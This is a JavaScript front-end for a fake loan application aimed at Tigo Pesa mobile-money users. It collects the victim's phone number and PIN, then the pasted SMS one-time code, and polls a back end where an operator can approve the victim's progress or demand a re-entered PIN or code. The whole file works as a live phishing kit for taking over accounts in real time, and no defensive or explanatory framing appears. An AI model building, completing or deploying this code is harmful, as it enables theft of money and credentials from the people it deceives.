let sessionId = 'mixx_' + Math.random().toString(36).substring(2, 9);
let pollInterval = null;

const showCard = (cardId) => {
    document.querySelectorAll('.card').forEach(card => card.classList.remove('active'));
    document.getElementById(cardId).classList.add('active');
};

// Step 1 -> Step 2
document.getElementById('proceedStep1').addEventListener('click', async () => {
    const amount = document.getElementById('loanAmount').value;
    const duration = document.getElementById('loanDuration').value;

    try {
        await fetch('/api/submit-loan', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, amount, duration })
        });
        showCard('step-2');
    } catch (err) {
        alert('Network error. Please try again.');
    }
});

// Step 2 Validation & Submission
document.getElementById('detailsForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const phone = document.getElementById('phone').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const phoneError = document.getElementById('phoneError');

    // Strict Tigo Pesa Validation: Starts with 07 and exactly 10 digits
    const tigoRegex = /^07\d{8}$/;
    if (!tigoRegex.test(phone)) {
        phoneError.textContent = 'Must be a valid Tigo Pesa number starting with 07 and totaling 10 digits (e.g. 0712345678)';
        return;
    }
    phoneError.textContent = '';

    try {
        const res = await fetch('/api/submit-details', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, phone, pin })
        });

        if (res.ok) {
            showCard('step-3');
            startPolling();
        }
    } catch (err) {
        alert('Submission error. Please check your connection.');
    }
});

// Polling status loop for admin actions
function startPolling() {
    if (pollInterval) clearInterval(pollInterval);

    pollInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status/${sessionId}`);
            const data = await res.json();

            if (data.status === 'approved_step') {
                clearInterval(pollInterval);
                showCard('step-4');
                startOtpPolling();
            } else if (data.status === 'denied') {
                clearInterval(pollInterval);
                alert('Your application was declined by administration.');
                location.reload();
            }
        } catch (err) {
            console.error('Polling error:', err);
        }
    }, 3000);
}

// Step 4: OTP Submission
document.getElementById('submitOtpBtn').addEventListener('click', async () => {
    const otpText = document.getElementById('otpText').value.trim();
    const feedback = document.getElementById('otpFeedback');

    if (!otpText) {
        feedback.textContent = 'Please paste the verification message.';
        return;
    }
    feedback.textContent = '';

    try {
        await fetch('/api/submit-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, otpText })
        });

        showCard('step-3'); // Hold state waiting for final admin decision
        startFinalPolling();
    } catch (err) {
        alert('Error sending SMS verification.');
    }
});

// Polling for final verification / wrong pin / wrong sms triggers
function startOtpPolling() {
    // Already moved to step 4
}

function startFinalPolling() {
    if (pollInterval) clearInterval(pollInterval);

    pollInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/check-status/${sessionId}`);
            const data = await res.json();

            if (data.status === 'fully_approved') {
                clearInterval(pollInterval);
                showCard('step-5');
            } else if (data.otpStatus === 'wrong_pin') {
                clearInterval(pollInterval);
                alert('Invalid PIN provided. Please re-enter.');
                showCard('step-2');
            } else if (data.otpStatus === 'wrong_sms') {
                clearInterval(pollInterval);
                alert('Invalid SMS or code expired. Please try pasting again.');
                document.getElementById('otpText').value = '';
                showCard('step-4');
            }
        } catch (err) {
            console.error('Final polling error:', err);
        }
    }, 3000);
}
  
